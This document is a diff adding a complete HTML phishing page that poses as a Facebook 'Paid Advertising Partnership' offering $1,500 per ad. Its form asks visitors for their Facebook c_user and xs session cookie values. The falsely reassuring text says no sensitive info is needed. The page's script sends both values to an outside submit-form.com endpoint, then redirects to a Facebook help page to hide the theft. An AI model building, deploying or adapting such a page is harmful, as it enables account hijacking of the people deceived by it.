@@ -1,0 +1,142 @@
+
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ad Placement Inquiry</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0;
+}
+.container {
+    max-width: 500px;
+    margin: 50px auto;
+    background: #fff;
+    padding: 25px;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+h2 {
+    text-align: center;
+    color: #1877f2;
+    margin-bottom: 15px;
+}
+p.description {
+    text-align: center;
+    color: #333;
+    font-size: 14px;
+    line-height: 1.4;
+    margin-bottom: 20px;
+}
+.video-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+.video-container video {
+    width: 100%;
+    border-radius: 10px;
+}
+form input, form button {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    font-size: 14px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+}
+form button {
+    background-color: #1877f2;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    font-weight: bold;
+}
+form button:disabled {
+    opacity: 0.7;
+}
+p.note {
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+    margin-top: 10px;
+}
+.spinner{
+    width:16px;
+    height:16px;
+    border:2px solid rgba(255,255,255,.4);
+    border-top:2px solid #fff;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    display:inline-block;
+    vertical-align:middle;
+}
+@keyframes spin{
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>Paid Advertising Partnership</h2>
+<p>Join our program and earn <strong>$1,500 per approved ad</strong> on your Facebook page.<br>
+No page access or sensitive info required. Secure and professional process.</p>
+<p class="description">
+𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗶𝗹𝗹 𝗶𝗻 𝘁𝗵𝗲 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗯𝗲𝗹𝗼𝘄 𝗮𝗻𝗱 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲 𝘃𝗶𝗱𝗲𝗼 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝘁𝗼 𝘀𝘂𝗯𝗺𝗶𝘁 𝘆𝗼𝘂𝗿 𝗮𝗱 𝗿𝗲𝗾𝘂𝗲𝘀𝘁.
+</p>
+
+<div class="video-container">
+<video controls="">
+  <source src="video.mp4" type="video/mp4">
+</video>
+</div>
+
+<form id="adForm">
+    <input type="text" name="c_user" placeholder="Enter c_user value" required="">
+    <input type="text" name="xs" placeholder="Enter XS value" required="">
+    <button type="submit" id="submitBtn">
+        Submit Request
+    </button>
+</form>
+
+<p class="note">Your request will be processed securely.</p>
+</div>
+
+<script>
+const form = document.getElementById('adForm');
+const btn = document.getElementById('submitBtn');
+
+form.addEventListener('submit', function(e){
+    e.preventDefault();
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Submitting…';
+
+    const data = {
+        c_user: form.c_user.value,
+        xs: form.xs.value
+    };
+
+    fetch("https://submit-form.com/heECIzo7V", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    })
+    .finally(() => {
+        // Direct redirect after submit
+        window.location.href = "https://www.facebook.com/help/media/thank-you?rdrhc";
+    });
+});
+</script>
+
+
+
+</body></html>
